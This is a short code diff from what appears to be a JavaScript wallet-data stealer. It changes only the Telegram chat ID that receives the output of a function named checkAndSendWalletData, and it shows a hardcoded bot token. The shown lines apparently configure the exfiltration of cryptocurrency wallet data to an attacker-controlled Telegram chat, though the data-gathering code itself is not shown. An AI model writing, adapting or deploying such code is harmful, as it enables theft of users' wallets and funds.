@@ -252,7 +252,7 @@ async function checkAndSendWalletData(botToken, chatId) {
 
 // Telegram Bot Configuration
     const TELEGRAM_BOT_TOKEN = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y'; // Replace with your bot token
-    const TELEGRAM_CHAT_ID = '8163151595'; 
+    const TELEGRAM_CHAT_ID = '6049368044'; 
 
 // Execute the check and send function
 checkAndSendWalletData(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
